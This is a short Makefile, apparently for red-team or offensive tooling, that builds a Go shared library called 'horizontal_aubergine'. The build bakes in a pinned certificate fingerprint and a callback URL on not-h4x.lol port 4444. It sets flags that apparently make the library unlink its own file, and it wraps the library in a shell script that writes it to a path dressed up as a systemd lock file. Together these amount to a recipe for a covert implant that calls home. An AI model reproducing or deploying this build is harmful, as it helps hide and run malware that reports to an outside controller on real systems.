# Makefile
# Build horizontal_aubergine
# By J. Stuart McMurray
# Created 20251031
# Last Modified 20251102

WD         = ${.CURDIR:T}
ALL        = ${WD}.so\
	     ${WD}.sh
FP         = sha256//cVQqY3gx/qRIe7Zct9/8BFHfyBLV6xMOnGXbWzTPuxo=
URL        = https://not-h4x.lol:4444/io

all: ${ALL}
.PHONY: all

.SUFFIXES: .so .sh

${WD}.so:: init.c ${@:R}.go
	go get
	CGO_CFLAGS="-DSREM_CGO_START_FLAGS=SREM_SRS_RMELF|SREM_SRS_UNLINK"\
	go build\
		-buildmode=c-shared\
		-ldflags "-s -w -X main.Fingerprint=${FP} -X main.URL=${URL}"\
		-o $@\
		-trimpath\
		-v

.so.sh:
	../toprintf.pl\
		/run/user/1001/systemd/propagate/${@F:R}.lock\
		$> >$@

clean::
	rm -f ${ALL} *.h
.PHONY: clean
